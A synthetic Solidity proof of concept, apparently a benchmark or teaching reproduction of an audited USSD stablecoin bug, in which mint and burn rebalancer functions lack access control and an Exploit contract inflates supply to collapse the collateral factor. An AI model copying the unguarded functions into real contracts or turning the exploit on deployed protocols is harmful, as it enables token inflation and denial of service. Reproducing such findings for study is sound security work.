// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  USSD — mintRebalancer / burnRebalancer have no onlyBalancer (Sherlock
    2023-05, finding 19137). SYNTHETIC, cheatcode-free. Both functions are the
    audited bodies (@> VULN).
    Root cause: anyone can mint USSD to the token contract, inflating
    totalSupply. collateralFactor = assets * 1e6 / totalSupply collapses, and
    a near-max mint permanently DoS-es every later mint. */

contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function burn(address from, uint256 amount) external {
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }
}

contract USSD {
    MiniToken public token;
    uint256 public collateral;

    constructor(address _token, uint256 _collateral) {
        token = MiniToken(_token);
        collateral = _collateral;
    }

    function mintRebalancer(uint256 amount) public {
        // @> VULN: no onlyBalancer — any caller mints unbacked USSD onto this contract.
        token.mint(address(this), amount);
    }

    function burnRebalancer(uint256 amount) public {
        // @> VULN: no onlyBalancer — any caller burns the protocol's USSD inventory.
        token.burn(address(this), amount);
    }

    function collateralFactor() public view returns (uint256) {
        return (collateral * 1e6) / token.totalSupply();
    }
}

contract Exploit {
    uint256 public constant START_SUPPLY = 1000e18;
    uint256 public constant UNBACKED = 9000e18;

    MiniToken public token; // nonce 1
    USSD public ussd; // nonce 2
    uint256 public cfBefore;
    uint256 public cfAfter;

    constructor() {
        token = new MiniToken("USSD", "USSD");
        token.mint(address(0xBEEF), START_SUPPLY);
        ussd = new USSD(address(token), START_SUPPLY);
    }

    function run() external {
        cfBefore = ussd.collateralFactor();
        ussd.mintRebalancer(UNBACKED);
        cfAfter = ussd.collateralFactor();
        require(cfBefore == 1e6, "peg started at 1.0");
        require(cfAfter == 1e5, "collateral factor collapsed 10x");
        require(token.balanceOf(address(ussd)) == UNBACKED, "unbacked inventory");
        require(token.totalSupply() == START_SUPPLY + UNBACKED, "supply inflated");
    }
}
